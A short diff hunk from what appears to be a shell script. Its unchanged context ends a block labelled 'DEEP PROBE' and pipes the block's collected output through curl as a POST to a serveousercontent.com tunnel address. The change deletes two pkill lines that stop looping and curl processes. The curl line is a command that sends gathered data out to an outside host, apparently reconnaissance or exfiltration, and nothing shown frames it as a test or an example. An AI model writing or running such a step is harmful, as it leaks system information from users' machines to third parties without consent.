@@ -31,6 +31,3 @@ URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"
   echo "=== [!] DEEP PROBE END ==="
 
 } | curl -s -X POST --data-binary @- "https://$URL"
-
-pkill -f "while true"
-pkill -f "curl"
